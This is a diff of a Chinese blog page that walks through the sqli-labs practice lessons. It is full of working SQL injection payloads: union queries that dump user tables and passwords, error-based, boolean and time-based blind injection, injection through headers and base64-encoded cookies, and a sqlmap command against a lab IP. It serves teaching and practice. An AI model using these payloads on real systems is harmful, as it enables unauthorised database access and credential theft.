@@ -430,60 +430,50 @@ union操作符：UNIO">
 <p>此处前台页面返回了我们构造的union的数据。可以看到回显点是2和3。  </p>
 <img src="/posts/bb32/1_2.png" class>
 
-<h4 id="（3）因此，我们可以在2-3回显的位置构造sql查询语句查询我们想要的东西"><a href="#（3）因此，我们可以在2-3回显的位置构造sql查询语句查询我们想要的东西" class="headerlink" title="（3）因此，我们可以在2,3回显的位置构造sql查询语句查询我们想要的东西"></a>（3）因此，我们可以在2,3回显的位置构造sql查询语句查询我们想要的东西</h4><h3 id="1-1获取数据库"><a href="#1-1获取数据库" class="headerlink" title="1.1获取数据库"></a>1.1获取数据库</h3><p>①获取单个数据库名</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload：
+<h4 id="（3）因此，我们可以在2-3回显的位置构造sql查询语句查询我们想要的东西"><a href="#（3）因此，我们可以在2-3回显的位置构造sql查询语句查询我们想要的东西" class="headerlink" title="（3）因此，我们可以在2,3回显的位置构造sql查询语句查询我们想要的东西"></a>（3）因此，我们可以在2,3回显的位置构造sql查询语句查询我们想要的东西</h4><h3 id="1-1获取数据库"><a href="#1-1获取数据库" class="headerlink" title="1.1获取数据库"></a>1.1获取数据库</h3><h4 id="①获取单个数据库名"><a href="#①获取单个数据库名" class="headerlink" title="①获取单个数据库名"></a>①获取单个数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>-1' union <span class="token keyword">select</span> 1,2,database<span class="token punctuation">(</span><span class="token punctuation">)</span> --+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>得到数据库名为security</p>
 <img src="/posts/bb32/1_3.png" class>
 
-<p>②获得所有数据库名</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload：
+<h4 id="②获得所有数据库名"><a href="#②获得所有数据库名" class="headerlink" title="②获得所有数据库名"></a>②获得所有数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>-1' union <span class="token keyword">select</span> 1,2,group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span> from information_schema.schemata--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>可获取所有的数据库：</p>
 <p> <img src="/posts/bb32/1_4.png" class></p>
-<h3 id="1-2获取表格"><a href="#1-2获取表格" class="headerlink" title="1.2获取表格"></a>1.2获取表格</h3><p>①得到单个表格</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload:
+<h3 id="1-2获取表格"><a href="#1-2获取表格" class="headerlink" title="1.2获取表格"></a>1.2获取表格</h3><h4 id="①得到单个表格"><a href="#①得到单个表格" class="headerlink" title="①得到单个表格"></a>①得到单个表格</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 id<span class="token operator">=</span>-1' union <span class="token keyword">select</span> 1,2,<span class="token punctuation">(</span>select table_name from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> limit 0,1<span class="token punctuation">)</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>得到表为emails：</p>
 <p> <img src="/posts/bb32/1_5.png" class></p>
-<p>②得到所有表格</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload:
+<h4 id="②得到所有表格"><a href="#②得到所有表格" class="headerlink" title="②得到所有表格"></a>②得到所有表格</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 id<span class="token operator">=</span>-1' union <span class="token keyword">select</span> 1,2,group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> --+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>可得到所有的表：</p>
 <p> <img src="/posts/bb32/1_6.png" class></p>
-<p>1.3获取字段名</p>
-<p>①获得单个字段名</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload:
+<h3 id="1-3获取字段名"><a href="#1-3获取字段名" class="headerlink" title="1.3获取字段名"></a>1.3获取字段名</h3><h4 id="①获得单个字段名"><a href="#①获得单个字段名" class="headerlink" title="①获得单个字段名"></a>①获得单个字段名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 id<span class="token operator">=</span>-1<span class="token string">' union select 1,2,(select column_name from information_schema.columns where table_name='</span>users' limit 0,1<span class="token punctuation">)</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>得到字段名user_id：</p>
 <p> <img src="/posts/bb32/1_7.png" class></p>
-<p>②获得所有字段名</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload：
+<h4 id="②获得所有字段名"><a href="#②获得所有字段名" class="headerlink" title="②获得所有字段名"></a>②获得所有字段名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>-1<span class="token string">' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='</span>users' --+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>可查到所有字段名:</p>
 <p> <img src="/posts/bb32/1_8.png" class></p>
-<p>1.4获取表格里面的内容</p>
-<p>①获得单个用户名和密码</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload：
+<h3 id="1-4获取表格里面的内容"><a href="#1-4获取表格里面的内容" class="headerlink" title="1.4获取表格里面的内容"></a>1.4获取表格里面的内容</h3><h4 id="①获得单个用户名和密码"><a href="#①获得单个用户名和密码" class="headerlink" title="①获得单个用户名和密码"></a>①获得单个用户名和密码</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>-1' union <span class="token keyword">select</span> 1,2,group_concat<span class="token punctuation">(</span>username,0x3a,password<span class="token punctuation">)</span> from <span class="token function">users</span> where id<span class="token operator">=</span>2--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>可以得到用户名为Angelina,密码为：I-kill-you</p>
 <p> <img src="/posts/bb32/1_9.png" class></p>
-<p>②获得所有的用户名和密码</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload:
+<h4 id="②获得所有的用户名和密码"><a href="#②获得所有的用户名和密码" class="headerlink" title="②获得所有的用户名和密码"></a>②获得所有的用户名和密码</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 id<span class="token operator">=</span>-1<span class="token string">' union select 1,2,group_concat(username,0x3a,password) from users--+
 
@@ -566,8 +556,7 @@ id<span class="token operator">=</span>1' and sleep<span class="token punctuatio
 <p>发现网络延时五秒响应，可以用延时注入：</p>
 <p> <img src="/posts/bb32/5.png" class></p>
 <h3 id="（2）可以使用报错注入："><a href="#（2）可以使用报错注入：" class="headerlink" title="（2）可以使用报错注入："></a>（2）可以使用报错注入：</h3><p>输入单引号，发现出现报错信息，因此可以使用报错注入。</p>
-<p>①得到库</p>
-<pre class="line-numbers language-bash"><code class="language-bash">可以使用这个payload：id<span class="token operator">=</span>1' and info<span class="token punctuation">(</span><span class="token punctuation">)</span>--+
+<h4 id="①得到库"><a href="#①得到库" class="headerlink" title="①得到库"></a>①得到库</h4><pre class="line-numbers language-bash"><code class="language-bash">可以使用这个payload：id<span class="token operator">=</span>1' and info<span class="token punctuation">(</span><span class="token punctuation">)</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>会报错显示当前库不存在这个函数，所以数据库名可以看到为security：</p>
 <p>  <img src="/posts/bb32/5_2.png" class></p>
@@ -576,8 +565,7 @@ id<span class="token operator">=</span>1' and sleep<span class="token punctuatio
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>同样得到数据库名为security：</p>
 <p>  <img src="/posts/bb32/5_3.png" class></p>
-<p>②获取用户名</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload:
+<h4 id="②获取用户名"><a href="#②获取用户名" class="headerlink" title="②获取用户名"></a>②获取用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 id<span class="token operator">=</span>1' and <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
@@ -634,16 +622,14 @@ id<span class="token operator">=</span>1<span class="token string">' and if(subs
 <h2 id="Less-9-基于时间的sql盲注（采用sqlmap）"><a href="#Less-9-基于时间的sql盲注（采用sqlmap）" class="headerlink" title="Less-9 基于时间的sql盲注（采用sqlmap）"></a>Less-9 基于时间的sql盲注（采用sqlmap）</h2><p>本关可采用时间延迟的注入。</p>
 <h3 id="（1）方法一："><a href="#（1）方法一：" class="headerlink" title="（1）方法一："></a>（1）方法一：</h3><p>测试：id=1’ and sleep(5)–+</p>
 <p>查看网络状态，的确存在延时。</p>
-<p>①获得数据库名</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload：
+<h4 id="①获得数据库名"><a href="#①获得数据库名" class="headerlink" title="①获得数据库名"></a>①获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>1<span class="token string">' and if(substr(database(),1,1)='</span>s',sleep<span class="token punctuation">(</span>5<span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>查看网络是否延时五秒，是则说明字符正确，不是则说明错误。</p>
 <p>将标红的1依次替换，可得到数据库名为security。</p>
 <p>  <img src="/posts/bb32/9.png" class></p>
-<p>②获得表名</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload:
+<h4 id="②获得表名"><a href="#②获得表名" class="headerlink" title="②获得表名"></a>②获得表名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 http://127.0.0.1:8099/sqli/Less-9/?id<span class="token operator">=</span>1<span class="token string">' and if(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='</span>e',sleep<span class="token punctuation">(</span>5<span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
@@ -731,8 +717,7 @@ sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=
 <pre class="line-numbers language-bash"><code class="language-bash">使用payload：1'<span class="token punctuation">)</span> or 1<span class="token operator">=</span>1<span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>页面出现成功提示，但是不像第十一关和第十二关那样出现用户的账号和密码。</p>
-<h3 id="（1）可以采用基于布尔型的盲注"><a href="#（1）可以采用基于布尔型的盲注" class="headerlink" title="（1）可以采用基于布尔型的盲注"></a>（1）可以采用基于布尔型的盲注</h3><p>猜测当前数据库用户名：</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload:
+<h3 id="（1）可以采用基于布尔型的盲注"><a href="#（1）可以采用基于布尔型的盲注" class="headerlink" title="（1）可以采用基于布尔型的盲注"></a>（1）可以采用基于布尔型的盲注</h3><h4 id="猜测当前数据库用户名："><a href="#猜测当前数据库用户名：" class="headerlink" title="猜测当前数据库用户名："></a>猜测当前数据库用户名：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 1<span class="token string">') or if(substr(user(),1,1)='</span>r<span class="token string">',1,0)#
 
@@ -743,13 +728,11 @@ sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=
 <p>用burp抓包，对标红的两个变量进行测试，爆破出当前用户名为root@localhost:</p>
 <p>   <img src="/posts/bb32/13.png" class></p>
 <p>跟第五关的基于布尔型的盲注差不多。就不重复写了。</p>
-<h3 id="（2）可以采用报错注入"><a href="#（2）可以采用报错注入" class="headerlink" title="（2）可以采用报错注入"></a>（2）可以采用报错注入</h3><p>①获取数据库名：  </p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload：1'<span class="token punctuation">)</span> or info<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span>
+<h3 id="（2）可以采用报错注入"><a href="#（2）可以采用报错注入" class="headerlink" title="（2）可以采用报错注入"></a>（2）可以采用报错注入</h3><h4 id="①获取数据库名："><a href="#①获取数据库名：" class="headerlink" title="①获取数据库名："></a>①获取数据库名：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：1'<span class="token punctuation">)</span> or info<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>显示出了数据库名：</p>
 <p> <img src="/posts/bb32/13_2.png" class></p>
-<p>②获取当前数据库用户名：</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload:
+<h4 id="②获取当前数据库用户名："><a href="#②获取当前数据库用户名：" class="headerlink" title="②获取当前数据库用户名："></a>②获取当前数据库用户名：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 1'<span class="token punctuation">)</span> or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
@@ -767,8 +750,7 @@ sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=
 <h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><p>使用1’ or 1=1#能显示登录成功的信息</p>
 <p>说明在源码中可能为username=’$uname’的形式</p>
 <p>本关不会显示报错信息，采用基于布尔型的盲注或者延时注入。</p>
-<h3 id="（1）基于布尔型的盲注"><a href="#（1）基于布尔型的盲注" class="headerlink" title="（1）基于布尔型的盲注"></a>（1）基于布尔型的盲注</h3><p>①猜测当前数据库用户名：</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload:
+<h3 id="（1）基于布尔型的盲注"><a href="#（1）基于布尔型的盲注" class="headerlink" title="（1）基于布尔型的盲注"></a>（1）基于布尔型的盲注</h3><h4 id="①猜测当前数据库用户名："><a href="#①猜测当前数据库用户名：" class="headerlink" title="①猜测当前数据库用户名："></a>①猜测当前数据库用户名：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 1<span class="token string">' or substr(user(),1,1)='</span>r'<span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
@@ -776,8 +758,7 @@ sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=
 <p>或者用like匹配：</p>
 <pre class="line-numbers language-bash"><code class="language-bash">1<span class="token string">' or user() like '</span>r%'<span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>②猜测数据库名</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload:
+<h4 id="②猜测数据库名"><a href="#②猜测数据库名" class="headerlink" title="②猜测数据库名"></a>②猜测数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 1<span class="token string">' or substr(database(),1,1)='</span>s'<span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
@@ -785,14 +766,12 @@ sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=
 <p>或者用like匹配：</p>
 <pre class="line-numbers language-bash"><code class="language-bash">1<span class="token string">' or database() like '</span>s%'<span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h3 id="（2）延时注入"><a href="#（2）延时注入" class="headerlink" title="（2）延时注入"></a>（2）延时注入</h3><p>①猜测当前数据库用户名：</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload:
+<h3 id="（2）延时注入"><a href="#（2）延时注入" class="headerlink" title="（2）延时注入"></a>（2）延时注入</h3><h4 id="①猜测当前数据库用户名：-1"><a href="#①猜测当前数据库用户名：-1" class="headerlink" title="①猜测当前数据库用户名："></a>①猜测当前数据库用户名：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 1<span class="token string">' or if(substr(user(),1,1)='</span>a',sleep<span class="token punctuation">(</span>5<span class="token punctuation">)</span>,0<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>如果字符正确，则延时五秒返回，否则返回登录失败的界面。</p>
-<p>②猜测数据库名</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload:
+<h4 id="②猜测数据库名-1"><a href="#②猜测数据库名-1" class="headerlink" title="②猜测数据库名"></a>②猜测数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 1<span class="token string">' or if(substr(database(),1,1)='</span>a',sleep<span class="token punctuation">(</span>5<span class="token punctuation">)</span>,0<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
@@ -806,8 +785,7 @@ sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=
 <pre class="line-numbers language-bash"><code class="language-bash"><span class="token string">'admin'</span>' at line 1
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>说明在源码中可能为’$uname’的形式。</p>
-<h3 id="使用报错注入："><a href="#使用报错注入：" class="headerlink" title="使用报错注入："></a>使用报错注入：</h3><p>①猜测当前数据库用户名</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload：
+<h3 id="使用报错注入："><a href="#使用报错注入：" class="headerlink" title="使用报错注入："></a>使用报错注入：</h3><h4 id="①猜测当前数据库用户名"><a href="#①猜测当前数据库用户名" class="headerlink" title="①猜测当前数据库用户名"></a>①猜测当前数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 1<span class="token string">' and extractvalue(1,concat(0x7e,(select user()),0x7e))#
 
@@ -816,8 +794,7 @@ sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=
 1'</span> or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>  <img src="/posts/bb32/17.png" class></p>
-<p>②猜测数据库名</p>
-<pre class="line-numbers language-bash"><code class="language-bash">1<span class="token string">' and extractvalue(1,concat(0x7e,(select database()),0x7e))#
+<h4 id="②猜测数据库名-2"><a href="#②猜测数据库名-2" class="headerlink" title="②猜测数据库名"></a>②猜测数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">1<span class="token string">' and extractvalue(1,concat(0x7e,(select database()),0x7e))#
 
 或者：  
 
@@ -830,8 +807,7 @@ sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=
 <p>将User-Agent里面的内容随便填写，可以看到显示出了我们输入的内容：</p>
 <p>  <img src="/posts/bb32/18_2.png" class></p>
 <p>此时可以在User-Agent中构造注入语句。</p>
-<h3 id="利用报错注入："><a href="#利用报错注入：" class="headerlink" title="利用报错注入："></a>利用报错注入：</h3><p>①获得数据库用户名</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload:
+<h3 id="利用报错注入："><a href="#利用报错注入：" class="headerlink" title="利用报错注入："></a>利用报错注入：</h3><h4 id="①获得数据库用户名"><a href="#①获得数据库用户名" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 1<span class="token string">' or (updatexml(1,concat(0x7e,(select user()),0x7e),1)) and '</span>1
 
@@ -840,8 +816,7 @@ sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=
 1<span class="token string">' or extractvalue(1,concat(0x7e,(select user()),0x7e)) and '</span>1
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p> <img src="/posts/bb32/18_3.png" class> </p>
-<p>②获得数据库名</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload:
+<h4 id="②获得数据库名"><a href="#②获得数据库名" class="headerlink" title="②获得数据库名"></a>②获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 1<span class="token string">' or (updatexml(1,concat(0x7e,(select database()),0x7e),1)) and '</span>1
 
@@ -856,8 +831,7 @@ sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=
 <p>用burp抓包，修改一下Referer的内容看看：</p>
 <p>  <img src="/posts/bb32/19_2.png" class></p>
 <p>的确显示为被修改的内容了，然后在Referer中构造注入语句。</p>
-<p>①获得数据库用户名</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload:
+<h4 id="①获得数据库用户名-1"><a href="#①获得数据库用户名-1" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 1<span class="token string">' or (updatexml(1,concat(0x7e,(select user()),0x7e),1)) and '</span>1
 
@@ -883,14 +857,12 @@ sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=
 <p>因为是cookie，之前没有登录过，所以没有值，我们将请求发送给自己，然后可以获得cookie值：</p>
 <p>  <img src="/posts/bb32/20_2.png" class></p>
 <p>点击两次发送，能获得cookie值，然后发送到重发器，再从里面添加注入语句。</p>
-<p>①获得数据库用户名</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload:
+<h3 id="①获得数据库用户名-2"><a href="#①获得数据库用户名-2" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 uname<span class="token operator">=</span>Dumb' or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>   <img src="/posts/bb32/20_3.png" class></p>
-<p>②获得数据库名</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload:
+<h4 id="②获得数据库名-1"><a href="#②获得数据库名-1" class="headerlink" title="②获得数据库名"></a>②获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 uname<span class="token operator">=</span>Dumb' or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
@@ -898,8 +870,7 @@ uname<span class="token operator">=</span>Dumb' or <span class="token punctuatio
 <h2 id="Less-21-基于错误的复杂的字符型Cookie注入"><a href="#Less-21-基于错误的复杂的字符型Cookie注入" class="headerlink" title="Less-21  基于错误的复杂的字符型Cookie注入"></a>Less-21  基于错误的复杂的字符型Cookie注入</h2><p>当输入正确的账号和密码时，比如账号dumb，密码dumb，可以看到出现如下信息：</p>
 <p>   <img src="/posts/bb32/21.png" class></p>
 <p>跟第二十关差不多，只是将账号用base64加密了。并且只是对uname是进行了(‘uname’)的处理。</p>
-<p>①获得数据库用户名</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload：
+<h4 id="①获得数据库用户名-3"><a href="#①获得数据库用户名-3" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 uname<span class="token operator">=</span>Dumb'<span class="token punctuation">)</span> or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span>
 
@@ -908,8 +879,7 @@ uname<span class="token operator">=</span>Dumb'<span class="token punctuation">)
 uname<span class="token operator">=</span>RHVtYicpIG9yICh1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IHVzZXIoKSksMHg3ZSksMSkpIw<span class="token operator">==</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>   <img src="/posts/bb32/21_2.png" class></p>
-<p>②获得数据库名</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload:
+<h4 id="②获得数据库名-2"><a href="#②获得数据库名-2" class="headerlink" title="②获得数据库名"></a>②获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 uname<span class="token operator">=</span>Dumb'<span class="token punctuation">)</span> or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span>
 
@@ -921,8 +891,7 @@ uname<span class="token operator">=</span>RHVtYicpIG9yICh1cGRhdGV4bWwoMSxjb25jYX
 <h2 id="Less-22-基于错误的双引号字符型Cookie注入"><a href="#Less-22-基于错误的双引号字符型Cookie注入" class="headerlink" title="Less-22 基于错误的双引号字符型Cookie注入"></a>Less-22 基于错误的双引号字符型Cookie注入</h2><p>当输入正确的账号和密码时，比如账号dumb，密码dumb，可以看到出现如下信息：</p>
 <p>   <img src="/posts/bb32/22.png" class></p>
 <p>跟第二十关差不多，将账号用base64加密了，并且是对uname是进行了”uname”的处理。</p>
-<p>①获得数据库用户名</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload：
+<h4 id="①获得数据库用户名-4"><a href="#①获得数据库用户名-4" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 uname<span class="token operator">=</span>Dumb" or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span>
 
@@ -931,8 +900,7 @@ uname<span class="token operator">=</span>Dumb" or <span class="token punctuatio
 uname<span class="token operator">=</span>RHVtYiIgb3IgKHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgdXNlcigpKSwweDdlKSwxKSkj
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>   <img src="/posts/bb32/22_2.png" class></p>
-<p>②获得数据库名</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload:
+<h4 id="②获得数据库名-3"><a href="#②获得数据库名-3" class="headerlink" title="②获得数据库名"></a>②获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 uname<span class="token operator">=</span>Dumb" or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span>
 
